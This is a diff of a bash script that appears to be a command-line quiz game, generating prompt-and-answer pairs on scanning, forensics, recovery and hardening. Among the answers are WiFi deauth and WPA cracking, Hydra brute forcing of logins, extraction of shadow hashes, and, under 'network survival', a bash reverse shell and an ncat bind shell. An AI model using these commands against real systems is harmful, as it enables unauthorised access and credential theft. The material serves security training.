+  questions+=("Check for anonymous FTP on ${ip}|nmap --script ftp-anon -p 21 ${ip}")
+
+  # Speed and stealth
+  questions+=("Slow scan ${ip} (evade IDS)|nmap -T1 ${ip}")
+  questions+=("Aggressive timing scan ${ip} (faster)|nmap -T4 ${ip}")
+
+  # Combined
+  questions+=("Full scan: all ports, version, scripts, all outputs|nmap -p- -sV -sC -oA full ${ip}")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 27: Hash Cracking
+gen_level26() {
+  eval "local questions=() $_QV"; _ctx
+  _fpick WIFI_INTERFACES; local wiface=$REPLY
+
+  # WiFi attacks
+  questions+=("Enable monitor mode on ${wiface}|airmon-ng start ${wiface}")
+  questions+=("Scan for WiFi networks|airodump-ng ${wiface}mon")
+  questions+=("Capture handshake from specific AP|airodump-ng -c 6 --bssid ${mac} -w capture ${wiface}mon")
+  questions+=("Send deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${wiface}mon")
+  questions+=("Crack WPA handshake using ${W}${wordlist}${C}|aircrack-ng -w ${wordlist} capture-01.cap")
+
+  # Netcat
+  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
+  questions+=("Connect to remote port|nc ${ip} ${port}")
+  questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
+  questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")
+
+  # Mass scanning
+  questions+=("Mass scan all ports on subnet at 10k rate|masscan -p1-65535 ${ip%.*}.0/24 --rate 10000")
+  questions+=("Masscan specific ports|masscan -p 22,80,443 ${ip%.*}.0/24 --rate 1000")
+
+  # Packet capture
+  questions+=("Capture packets on ${iface}|tcpdump -i ${iface}")
+  questions+=("Capture and save to ${W}${pcap}${C}|tcpdump -i ${iface} -w ${pcap}")
+  questions+=("Read saved ${W}${pcap}${C}|tcpdump -r ${pcap}")
+  questions+=("Capture only port ${port} traffic|tcpdump -i ${iface} port ${port}")
+  questions+=("Capture only traffic to/from ${ip}|tcpdump -i ${iface} host ${ip}")
+  questions+=("Capture first ${n} packets|tcpdump -i ${iface} -c ${n}")
+  questions+=("Capture with verbose output|tcpdump -i ${iface} -vvv")
+  questions+=("Capture DNS traffic only|tcpdump -i ${iface} port 53")
+  questions+=("Capture HTTP traffic only|tcpdump -i ${iface} port 80")
+  questions+=("Don't resolve hostnames in capture|tcpdump -i ${iface} -n")
+
+
+  # Wireless recon
+  questions+=("Show wireless interfaces|iw dev")
+  questions+=("Scan for nearby APs|iw dev ${wiface} scan|iwlist ${wiface} scan")
+  questions+=("Show connected WiFi info|iw dev ${wiface} link")
+  questions+=("Set WiFi channel to 6|iw dev ${wiface}mon set channel 6")
+  questions+=("Disable monitor mode|airmon-ng stop ${wiface}mon")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 19: String & Arrays
+gen_level27() {
+  eval "local questions=() $_QV"; _ctx
+  local hidx=$((RANDOM % ${#HASHCAT_MODES[@]}))
+  local hmode=${HASHCAT_MODES[$hidx]} hname=${HASH_NAMES[$hidx]}
+
+  # Hashcat dictionary attacks
+  questions+=("Dictionary attack on MD5 (-m 0) hashes in ${hash} using ${W}${wordlist}${C}|hashcat -m 0 ${hash} ${wordlist}")
+  questions+=("Dictionary attack on ${hname} (-m ${hmode}) hashes using ${W}${wordlist}${C}|hashcat -m ${hmode} ${hash} ${wordlist}")
+  questions+=("Crack Windows NTLM hashes (-m 1000) in ${hash} using ${W}${wordlist}${C}|hashcat -m 1000 ${hash} ${wordlist}")
+
+  # Hashcat brute force
+  questions+=("Brute force 4-digit PIN (MD5)|hashcat -m 0 -a 3 ${hash} ?d?d?d?d")
+  questions+=("Mask attack: Capital + 5 lower + 2 digits|hashcat -m 0 -a 3 ${hash} ?u?l?l?l?l?l?d?d")
+
+  # Hashcat rules & session
+  questions+=("Crack ${hash} with rules using ${W}${wordlist}${C}|hashcat -m 0 -r rules/best64.rule ${hash} ${wordlist}")
+  questions+=("Show already cracked from ${hash}|hashcat -m 0 ${hash} --show")
+  questions+=("Resume interrupted hashcat session|hashcat --restore")
+
+  # John the Ripper
+  questions+=("Crack ${hash} with john (auto-detect format)|john ${hash}")
+  questions+=("Crack ${hash} with john using ${wordlist}|john --wordlist=${wordlist} ${hash}")
+  questions+=("Show cracked passwords from john|john --show ${hash}")
+  questions+=("List supported john formats|john --list=formats")
+
+  # John hash extraction (FIXED - was incorrect before)
+  questions+=("Extract hash from encrypted ZIP file|zip2john archive.zip > hash.txt")
+  questions+=("Extract hash from encrypted PDF|pdf2john document.pdf > hash.txt")
+  questions+=("Extract hash from encrypted RAR|rar2john archive.rar > hash.txt")
+  questions+=("Extract hash from /etc/shadow format|unshadow /etc/passwd /etc/shadow > hash.txt")
+
+  # Hydra
+  questions+=("Brute force SSH login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ssh")
+  questions+=("Brute force FTP login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ftp")
+  questions+=("Brute force HTTP basic auth on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} http-get /")
+  questions+=("Brute force HTTP POST login form using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'")
+  questions+=("Brute force with ${W}${wordlist}${C} and username list|hydra -L users.txt -P ${wordlist} ${ip} ssh")
+  questions+=("Brute force with ${W}${wordlist}${C}, limit to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh")
+
+  # Encoding/decoding
+  questions+=("Encode string 'secret' to base64§echo -n 'secret' | base64")
+  questions+=("Decode base64 file encoded.txt|base64 -d encoded.txt")
+  questions+=("Generate MD5 hash of string 'password'§echo -n 'password' | md5sum")
+  questions+=("Generate SHA256 hash of string 'password'§echo -n 'password' | sha256sum")
+  questions+=("Generate SHA256 hash of file ${hash}|sha256sum ${hash}")
+
+  # Hex operations
+  questions+=("Convert 'hello' to hex§echo -n 'hello' | xxd -p")
+  questions+=("Convert hex back to ascii§echo '68656c6c6f' | xxd -r -p")
+  questions+=("Hex dump ${W}${bin}${C} with addresses|xxd ${bin}")
+  questions+=("Hex dump ${W}${bin}${C} (no addresses)|xxd -p ${bin}")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 28: Forensics
+gen_level28() {
+  eval "local questions=() $_QV"; _ctx
+
+  # String extraction
+  questions+=("Extract ASCII strings from ${bin}|strings ${bin}")
+  questions+=("Extract strings minimum 10 chars in ${W}${bin}${C}|strings -n 10 ${bin}")
+  questions+=("Extract Unicode strings (Windows binaries) in ${W}${bin}${C}|strings -e l ${bin}")
+  questions+=("Find URLs in ${W}${bin}${C}§strings ${bin} | grep -E 'https?://'")
+  questions+=("Find email addresses in ${W}${bin}${C}§strings ${bin} | grep -E '[A-Za-z0-9._%+-]+@'")
+
+  # ELF analysis
+  questions+=("Show ELF file header in ${W}${bin}${C}|readelf -h ${bin}")
+  questions+=("Show ELF symbols in ${W}${bin}${C}|readelf -s ${bin}")
+  questions+=("Show all ELF info in ${W}${bin}${C}|readelf -a ${bin}")
+  questions+=("List shared library dependencies of ${W}${bin}${C}|ldd ${bin}")
+
+  # Radare2
+  questions+=("Analyze ${bin} with radare2|r2 -A ${bin}")
+  questions+=("Disassemble main function of ${W}${bin}${C}|r2 -qc 'aaa; pdf @main' ${bin}")
+  questions+=("List functions in ${W}${bin}${C}|r2 -qc 'aaa; afl' ${bin}")
+
+  # Binwalk
+  questions+=("Scan ${bin} for embedded files|binwalk ${bin}")
+  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}")
+  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}")
+
+  # Memory forensics (volatility3) - most common
+  local -a _MEM_IMGS=(memory.dmp vmcore.dmp pagefile.sys)
+  _fpick _MEM_IMGS; local memimg=$REPLY
+  questions+=("List processes from memory dump|vol -f ${memimg} windows.pslist")
+  questions+=("List network connections from memory|vol -f ${memimg} windows.netscan")
+  questions+=("Show command lines of processes|vol -f ${memimg} windows.cmdline")
+  questions+=("Scan for files in memory dump|vol -f ${memimg} windows.filescan")
+
+  # File metadata
+  questions+=("Extract all metadata from ${photo}|exiftool ${photo}")
+  questions+=("Extract GPS coordinates from ${W}${photo}${C}|exiftool '-GPS*' ${photo}")
+  questions+=("Remove all metadata from ${photo}|exiftool -all= ${photo}")
+
+  # Disk imaging
+  questions+=("Create disk image of /dev/sda to ${W}${img}${C}|dd if=/dev/sda of=${img} bs=4M status=progress")
+  questions+=("Mount ${W}${img}${C} read-only|mount -o ro,loop ${img} /mnt/evidence")
+  questions+=("Verify checksums file|sha256sum -c ${hash}")
+
+  # File recovery / carving
+  questions+=("Recover deleted files from ${img}|foremost -i ${img}")
+  questions+=("Recover specific file types from ${W}${img}${C}|foremost -t jpg,pdf -i ${img}")
+  questions+=("Foremost with custom output dir on ${W}${img}${C}|foremost -i ${img} -o ${dir}/")
+  questions+=("List files in ${W}${img}${C} (TSK)|fls ${img}")
+  questions+=("List files recursively in ${W}${img}${C}|fls -r ${img}")
+  questions+=("List deleted files in ${W}${img}${C}|fls -d ${img}")
+  questions+=("Create filesystem timeline|mactime -b ${dir}/bodyfile")
+  questions+=("Create bodyfile from ${W}${img}${C}|fls -r -m / ${img} > ${dir}/bodyfile")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 24: Network Tools
 gen_level29() {
   eval "local questions=() $_QV"; _ctx
 
@@ -2733,166 +2800,101 @@ gen_level29() {
 }
 
 # Level 22: Advanced Regex
-gen_level22() {
+gen_level30() {
   eval "local questions=() $_QV"; _ctx
 
-  # Regex lookahead/lookbehind (grep -P for PCRE)
-  questions+=("Match 'error' followed by number in ${W}${log}${C}|grep -P 'error(?=\\d)' ${log}")
-  questions+=("Match 'error' NOT followed by number in ${W}${log}${C}|grep -P 'error(?!\\d)' ${log}")
-  questions+=("Match number preceded by '$' in ${W}${log}${C}|grep -P '(?<=\\$)\\d+' ${log}")
-  questions+=("Match number NOT preceded by '$' in ${W}${log}${C}|grep -P '(?<!\\$)\\d+' ${log}")
+  # === EMERGENCY RECOVERY ===
+  questions+=("Remount root filesystem read-write|mount -o remount,rw /")
+  questions+=("Emergency single-user mode|init 1|systemctl rescue")
+  questions+=("Chroot into system mounted at /mnt|chroot /mnt /bin/bash")
+  questions+=("Regenerate initramfs (Arch)|mkinitcpio -P")
+  questions+=("Regenerate GRUB config|grub-mkconfig -o /boot/grub/grub.cfg")
+  questions+=("Fix broken sudo (as root)|chown root:root /usr/bin/sudo; chmod 4755 /usr/bin/sudo")
+  questions+=("Reset root password from recovery|passwd root")
+  questions+=("Reinstall bootloader to MBR|grub-install /dev/sda")
+  questions+=("Check and repair filesystem|fsck -y /dev/sda1")
+  questions+=("Mount LUKS encrypted partition|cryptsetup open /dev/sda2 cryptroot && mount /dev/mapper/cryptroot /mnt")
 
-  # Non-greedy matching
-  questions+=("Non-greedy match between quotes in ${W}${log}${C}|grep -oP '\".*?\"' ${log}")
-  questions+=("Match shortest HTML tag in ${W}${txt}${C}|grep -oP '<.*?>' ${txt}")
-  questions+=("Extract first word after colon in ${W}${log}${C}|grep -oP ':\\s*\\K\\S+' ${log}")
+  # === HARDCORE ONE-LINERS ===
+  questions+=("Find and kill process using port ${port}|kill \$(lsof -t -i:${port})|fuser -k ${port}/tcp")
+  questions+=("Find large files (>100M) modified in 24h|find / -type f -size +100M -mtime -1 2>/dev/null")
+  questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'")
+  questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/")
+  questions+=("Parallel compress all logs§find /var/log -name '*.log' | parallel gzip")
+  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32")
+  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
+  questions+=("Emergency disk space cleanup|find /var/log -name '*.gz' -mtime +7 -delete")
+  questions+=("Find recently modified system files|find /etc -mmin -60 -type f 2>/dev/null")
+  questions+=("List all open ports and processes§ss -tlpn | awk 'NR>1 {print \$4, \$6}'")
 
-  # Word boundaries and anchors
-  questions+=("Match whole word 'error' only in ${W}${log}${C}|grep -w 'error' ${log}|grep -P '\\berror\\b' ${log}")
-  questions+=("Match 'error' at word boundary in ${W}${log}${C}|grep -P '\\berror' ${log}")
-  questions+=("Match lines starting with digit in ${W}${txt}${C}|grep '^[0-9]' ${txt}")
-  questions+=("Match lines ending with digit in ${W}${txt}${C}|grep '[0-9]$' ${txt}")
-  questions+=("Match empty lines in ${W}${txt}${C}|grep '^$' ${txt}")
+  # === NETWORK SURVIVAL ===
+  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}")
+  questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
+  questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
+  questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
+  questions+=("Bind shell with ncat|ncat -lvnp ${port} -e /bin/bash")
+  questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
+  questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")
 
-  # Character classes
-  questions+=("Match any vowel in ${W}${txt}${C}|grep '[aeiou]' ${txt}")
-  questions+=("Match non-digit in ${W}${txt}${C}|grep '[^0-9]' ${txt}")
-  questions+=("Match word character in ${W}${txt}${C}|grep -P '\\w' ${txt}")
-  questions+=("Match whitespace in ${W}${txt}${C}|grep -P '\\s' ${txt}")
-  questions+=("Match hex character in ${W}${txt}${C}|grep '[0-9a-fA-F]' ${txt}")
+  # === SYSTEM FORENSICS ===
+  questions+=("List all cron jobs system-wide|for u in \$(cut -f1 -d: /etc/passwd); do crontab -l -u \$u 2>/dev/null; done; cat /etc/crontab; ls /etc/cron.*")
+  questions+=("Find files modified in last hour|find / -mmin -60 -type f 2>/dev/null")
+  questions+=("List all users with shell access§grep -vE 'nologin|false' /etc/passwd")
+  questions+=("Show failed login attempts§journalctl _COMM=sshd | grep -iE 'failed|invalid'§grep 'Failed' /var/log/auth.log")
+  questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null")
+  questions+=("Check for rootkits|chkrootkit|rkhunter --check")
+  questions+=("Dump all environment variables§env; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
+  questions+=("Show all listening processes with full path§ss -tlpn | awk 'NR>1 {print \$4}' | sed 's/.*://' | xargs -I{} lsof -i:{}")
+  questions+=("Find processes with deleted binaries§ls -la /proc/*/exe 2>/dev/null | grep deleted")
+  questions+=("Memory dump of process|gcore -o dump \$(pgrep -f process)")
 
-  # Quantifiers
-  questions+=("Match exactly ${n} digits in ${W}${log}${C}|grep -E '[0-9]{${n}}' ${log}")
-  questions+=("Match ${n} or more digits in ${W}${log}${C}|grep -E '[0-9]{${n},}' ${log}")
-  questions+=("Match 2 to ${n} digits in ${W}${log}${C}|grep -E '[0-9]{2,${n}}' ${log}")
-  questions+=("Match optional 's' (plurals) in ${W}${log}${C}|grep -E 'errors?' ${log}")
+  # === DEFENSIVE HARDENING ===
+  questions+=("Block IP with iptables|iptables -A INPUT -s ${ip} -j DROP")
+  questions+=("Block IP with nftables|nft add rule inet filter input ip saddr ${ip} drop")
+  questions+=("Rate limit SSH connections|iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP")
+  questions+=("Enable SYN cookies|echo 1 > /proc/sys/net/ipv4/tcp_syncookies")
+  questions+=("Disable IP forwarding|echo 0 > /proc/sys/net/ipv4/ip_forward")
+  questions+=("Flush all firewall rules|iptables -F; iptables -X")
+  questions+=("List all iptables rules|iptables -L -n -v")
+  questions+=("List all nftables rules|nft list ruleset")
+  questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log")
+  questions+=("Lock user account§passwd -l ${user}§usermod -L ${user}")
 
-  # Groups and backreferences
-  questions+=("Match repeated word in ${W}${txt}${C}|grep -P '\\b(\\w+)\\s+\\1\\b' ${txt}")
-  questions+=("Match repeated character in ${W}${txt}${C}|grep -E '(.)\\1' ${txt}")
-  questions+=("Capture and replace with sed in ${W}${log}${C}|sed -E 's/(error):\\s*(.*)/\\2 [\\1]/' ${log}")
-  questions+=("Swap two words in ${W}${txt}${C}|sed -E 's/(\\w+)\\s+(\\w+)/\\2 \\1/' ${txt}")
+  # === PROCESS NINJA ===
+  questions+=("Watch memory hogs in realtime§watch -n1 'ps aux --sort=-%mem | head -5'")
+  questions+=("Find process using open file ${W}${txt}${C}§lsof ${txt}§fuser ${txt}")
+  questions+=("Trace system calls of process|strace -p \$(pgrep -f process)")
+  questions+=("Kill all processes by name|pkill -9 -f pattern")
+  questions+=("Nice a running process|renice -n 10 -p PID")
 
-  # Advanced sed
-  questions+=("Delete lines matching pattern in ${W}${txt}${C}|sed '/pattern/d' ${txt}")
-  questions+=("Print only lines matching in ${W}${txt}${C}|sed -n '/pattern/p' ${txt}")
-  questions+=("Replace only on lines matching in ${W}${log}${C}|sed '/error/s/foo/bar/g' ${log}")
-  questions+=("Insert line before match in ${W}${txt}${C}|sed '/pattern/i inserted line' ${txt}")
-  questions+=("Insert line after match in ${W}${txt}${C}|sed '/pattern/a inserted line' ${txt}")
-  questions+=("Change entire matching line in ${W}${txt}${C}|sed '/pattern/c replacement line' ${txt}")
-  questions+=("Multiple sed commands in ${W}${txt}${C}|sed -e 's/a/b/' -e 's/c/d/' ${txt}")
-  questions+=("Sed with address range in ${W}${txt}${C}|sed '5,10s/old/new/g' ${txt}")
-  questions+=("Delete from line 5 to pattern in ${W}${txt}${C}|sed '5,/pattern/d' ${txt}")
-  questions+=("Transform case (lowercase) in ${W}${txt}${C}|sed 's/.*/\\L&/' ${txt}")
-  questions+=("Transform case (uppercase) in ${W}${txt}${C}|sed 's/.*/\\U&/' ${txt}")
-  questions+=("Capitalize first letter in ${W}${txt}${C}|sed 's/.*/\\u&/' ${txt}")
+  # === DISK SURVIVAL ===
+  questions+=("Find disk usage hogs§du -xh / 2>/dev/null | sort -rh | head -20")
+  questions+=("Clear systemd journal logs|journalctl --vacuum-size=100M")
+  questions+=("Sync and drop caches|sync; echo 3 > /proc/sys/vm/drop_caches")
+  questions+=("Check disk health (SMART)|smartctl -a /dev/sda")
+  questions+=("Secure wipe ${W}${txt}${C}|shred -vfz -n 3 ${txt}")
+  questions+=("Create RAM disk|mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk")
+  questions+=("Clone disk with progress|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync")
 
-  # Advanced awk
-  questions+=("Print lines where field > value in ${W}${csv}${C}|awk -F',' '\$1 > 100' ${csv}")
-  questions+=("Print unique values from column in ${W}${csv}${C}|awk -F',' '!seen[\$1]++' ${csv}")
-  questions+=("Sum column values in ${W}${csv}${C}|awk -F',' '{sum+=\$2} END{print sum}' ${csv}")
-  questions+=("Calculate average in ${W}${csv}${C}|awk -F',' '{sum+=\$2; n++} END{print sum/n}' ${csv}")
-  questions+=("Find max value in column (skip header) in ${W}${csv}${C}|awk -F',' 'NR==2{max=\$1} NR>1 && \$1>max{max=\$1} END{print max}' ${csv}")
-  questions+=("Find min value in column (skip header) in ${W}${csv}${C}|awk -F',' 'NR==2{min=\$1} NR>1 && \$1<min{min=\$1} END{print min}' ${csv}")
-  questions+=("Group by and count in ${W}${csv}${C}|awk -F',' '{count[\$1]++} END{for(k in count) print k, count[k]}' ${csv}")
-  questions+=("Conditional print in ${W}${csv}${C}|awk -F',' '\$3==\"active\" {print \$1, \$2}' ${csv}")
-  questions+=("Print with custom separator in ${W}${csv}${C}§awk -F',' 'BEGIN{OFS=\"|\"} {print \$1,\$2}' ${csv}")
-  questions+=("String functions: length in ${W}${txt}${C}|awk '{print length(\$0)}' ${txt}")
-  questions+=("String functions: substr in ${W}${txt}${C}|awk '{print substr(\$0,1,10)}' ${txt}")
-  questions+=("String functions: gsub in ${W}${txt}${C}|awk '{gsub(/old/,\"new\"); print}' ${txt}")
-  questions+=("String functions: split in ${W}${txt}${C}|awk '{n=split(\$0,a,\":\"); print a[1]}' ${txt}")
-  questions+=("Pattern range in ${W}${txt}${C}|awk '/start/,/end/' ${txt}")
-  questions+=("Print line numbers in ${W}${txt}${C}|awk '{print NR\": \"\$0}' ${txt}")
-  questions+=("Skip header line in ${W}${csv}${C}|awk 'NR>1' ${csv}")
-  questions+=("Print every nth line in ${W}${txt}${C}|awk 'NR%${n}==0' ${txt}")
-  questions+=("Reverse fields in ${W}${txt}${C}|awk '{for(i=NF;i>0;i--) printf \"%s \",\$i; print \"\"}' ${txt}")
+  # === PURE BASH MAGIC ===
+  questions+=("Random string generator§tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32")
+  questions+=("Timestamp in epoch|date +%s")
+  questions+=("Convert epoch to date|date -d @1234567890")
+  questions+=("Parallel execution with xargs§cat urls.txt | xargs -P 10 -I{} curl -s {}")
+  questions+=("Timeout a command|timeout 5 long_running_cmd")
+  questions+=("Retry command until success|until cmd; do sleep 1; done")
+  questions+=("Lock file to prevent concurrent runs§exec 200>/tmp/lock; flock -n 200 || exit 1")
+  questions+=("Named pipe (FIFO)|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe")
 
-  # Combining tools
-  questions+=("Complex: extract, sort, count in ${W}${log}${C}§grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log} | sort | uniq -c | sort -rn")
-  questions+=("Complex: top N by frequency in ${W}${log}${C}§awk '{print \$1}' ${log} | sort | uniq -c | sort -rn | head -${n}")
-  questions+=("Complex: join lines with comma in ${W}${txt}${C}|paste -sd',' ${txt}")
-
-  # Process substitution - advanced piping
-  questions+=("Diff sorted contents of ${txt} and ${txt2}|diff <(sort ${txt}) <(sort ${txt2})")
-  questions+=("Compare output of two commands|diff <(cmd1) <(cmd2)")
-  questions+=("Feed ${W}${log}${C} as input to program (process substitution)|wc -l <(grep pattern ${log})")
+  # === OFFLINE/AIR-GAPPED ===
+  questions+=("Create bootable USB|dd if=arch.iso of=/dev/sdb bs=4M status=progress oflag=sync")
+  questions+=("Generate SSH key (no network needed)|ssh-keygen -t ed25519 -f ~/.ssh/offline_key")
+  questions+=("Encrypt ${W}${txt}${C} for offline transport|gpg -c --cipher-algo AES256 ${txt}")
 
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 14: System Admin
-gen_level14() {
-  eval "local questions=() $_QV"; _ctx
-  _fphrase git vim tmux htop curl wget rsync jq; local pkg=$REPLY
-  _fphrase ls cat grep find sort awk sed head; local sysbin=$REPLY
-
-  # Network diagnostics
-  questions+=("Ping ${ip} 5 times|ping -c 5 ${ip}")
-  questions+=("Ping ${ip} continuously|ping ${ip}")
-  questions+=("Trace route to ${ip} (use ${Y}traceroute${C})|traceroute ${ip}|tracepath ${ip}")
-  questions+=("DNS lookup for ${host}|dig ${host}|nslookup ${host}|host ${host}")
-  questions+=("Reverse DNS lookup for ${ip}|dig -x ${ip}|host ${ip}")
-  questions+=("Check if port ${port} is open on ${ip}|nc -zv ${ip} ${port}")
-  questions+=("Show listening ports|ss -tlnp|netstat -tlnp")
-  questions+=("Show all network connections|ss -tunapl|netstat -tunapl")
-  questions+=("Show routing table|ip route|ip r")
-  questions+=("Show network interfaces|ip addr|ip a")
-
-  # System monitoring
-  questions+=("Show disk space usage|df -h")
-  questions+=("Show memory usage|free -h")
-  questions+=("Show system uptime|uptime")
-  questions+=("Show system info|uname -a")
-  questions+=("Show CPU info|lscpu|cat /proc/cpuinfo")
-  questions+=("Show kernel messages|dmesg|dmesg -T|journalctl -k")
-  questions+=("Interactive process viewer|top|htop|btop")
-  questions+=("Show top 10 memory-hungry processes§ps aux --sort=-%mem | head -11")
-  questions+=("Show process tree|pstree|ps auxf")
-
-  # Service management (systemd)
-  questions+=("Check status of ${svc}|systemctl status ${svc}")
-  questions+=("Start ${svc}|systemctl start ${svc}")
-  questions+=("Stop ${svc}|systemctl stop ${svc}")
-  questions+=("Restart ${svc}|systemctl restart ${svc}")
-  questions+=("Enable ${svc} at boot|systemctl enable ${svc}")
-  questions+=("Disable ${svc} at boot|systemctl disable ${svc}")
-  questions+=("List running services|systemctl list-units --type=service --state=running")
-  questions+=("Show services that failed to start|systemctl --failed")
-  questions+=("Reload systemd daemon|systemctl daemon-reload")
-  questions+=("Show ${svc} logs|journalctl -u ${svc}")
-  questions+=("Follow ${svc} logs|journalctl -fu ${svc}")
-  questions+=("Show logs since boot|journalctl -b")
-  questions+=("Show last 100 log lines|journalctl -n 100")
-
-  # User/permission management
-  questions+=("Run ${script} as root|sudo ${script}")
-  questions+=("Switch to root shell|sudo -i|su -|sudo su|sudo -s|sudo bash")
-  questions+=("Switch to user ${user}|su - ${user}")
-  questions+=("Add user ${user}|useradd -m ${user}|sudo useradd -m ${user}")
-  questions+=("Delete user ${user}|userdel -r ${user}|sudo userdel -r ${user}")
-  questions+=("Change password for ${user}|passwd ${user}|sudo passwd ${user}")
-  questions+=("Add ${user} to group wheel|usermod -aG wheel ${user}")
-  questions+=("List groups for ${user}|groups ${user}|id ${user}")
-  questions+=("Change owner of ${txt} to ${user}|chown ${user} ${txt}")
-  questions+=("Change owner and group of ${txt} to ${user}|chown ${user}:${user} ${txt}")
-  questions+=("Change owner of ${dir}/ recursively to ${user}|chown -R ${user}:${user} ${dir}/")
-  questions+=("Show current user|whoami")
-  questions+=("Show user id info|id")
-
-  # Package management (common patterns)
-  questions+=("Install package (Arch)|pacman -S ${pkg}|paru -S ${pkg}")
-  questions+=("Upgrade all packages (Arch)|pacman -Syu|paru -Syu")
-  questions+=("Search for package|pacman -Ss ${term}|paru -Ss ${term}")
-  questions+=("Show package info (Arch)|pacman -Qi ${pkg}|paru -Qi ${pkg}")
-  questions+=("List installed packages|pacman -Q|paru -Q")
-  questions+=("Which package owns a file (Arch)|pacman -Qo /usr/bin/${sysbin}|paru -Qo /usr/bin/${sysbin}")
-
-  # Security audit
-  questions+=("Run full system security audit|lynis audit system")
-  questions+=("Lynis scan specific category|lynis audit system --tests-from-group networking")
-
-  printf '%s\n' "${questions[@]}"
-}
+# Level 23: Git
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # QUESTION SYSTEM - Generate and manage questions per level
